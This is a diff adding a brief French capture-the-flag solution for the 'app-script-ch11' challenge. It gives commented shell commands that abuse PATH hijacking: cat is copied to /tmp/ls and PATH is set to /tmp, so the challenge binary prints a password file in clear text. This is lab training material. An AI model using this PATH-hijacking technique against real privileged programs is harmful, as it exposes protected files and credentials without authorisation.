@@ -1,0 +1,7 @@
+# Il est indispensable d'executer la commande cat à la place de ls, donc il faut copier l'exe dans /tmp
+app-script-ch11@challenge02:~$ cp /bin/cat /tmp/ls
+# Changer la valeur de la variable d'environnement de PATH
+app-script-ch11@challenge02:~$ PATH=/tmp
+app-script-ch11@challenge02:~$ echo $PATH
+# En executant le fichier, il lancera une /tmp/ls qui est en réalité bin/cat, le mot de passe s'affichera en clair
+app-script-ch11@challenge02:~$ ./ch11
